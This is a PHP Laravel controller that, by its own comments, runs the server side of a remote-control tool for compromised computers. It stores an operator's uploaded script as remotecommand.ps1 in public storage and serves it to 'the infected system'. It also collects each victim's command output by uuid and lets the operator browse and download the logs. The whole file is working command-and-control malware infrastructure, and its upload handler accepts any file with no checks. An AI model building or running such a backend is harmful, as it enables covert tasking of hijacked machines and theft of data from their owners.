<?php

namespace App\Http\Controllers;

use App\Script;
use Illuminate\Http\Request;

class HomeController extends Controller
{
    public function index()
    {
        return view('home');
    }

    // Store uploaded new script by user
    public function store(Request $request)
    {
        $file = $request->file('file');
        $path = $file->move(public_path('storage/upload'),
            //date("Y.m.d.H.i.s".".".$file->getClientOriginalExtension()
            'remotecommand.'.$file->getClientOriginalExtension()
        );
        return view('home', compact('file', 'path'));
    }

    // Store uploaded result (from executing the DLed script by the infected system)
    public function upload(Request $request)
    {
        //$saveDirectory = public_path('storage/results/');
        $fileContent = $request['fileContent'];
        if (isset($fileContent) && $request['uuid']){
            //file_put_contents($saveDirectory . $request['uuid'] . date("Y.m.d.H.i.s") . '.txt', $fileContent);
            $script = new Script;
            $script->uuid = $request->uuid;
            $script->content = $fileContent;
            $script->save();
            $response = [
                'msg'   => 'Upload successfull',
            ];

            return $response;
        }

        $response = [
            'msg'   => 'Upload failed'
        ];
        return $response;
    }

    // Give the new script to the infected system
    public function download()
    {
        $path = public_path('storage/upload/remotecommand.ps1');
        return response()->download($path);
    }

    // show logs with pagination
    public function showLog()
    {
        $logs = Script::paginate(10);//orderBy('created_at', 'desc')->get();
        return view('log', [
            'logs' => $logs
        ]);
    }


    public function dllog($id)
    {
        $log = Script::find($id);
        $log_content = $log->content;
        file_put_contents(public_path('log.txt'), $log_content);
        return response()->download(public_path('log.txt'));
    }
}
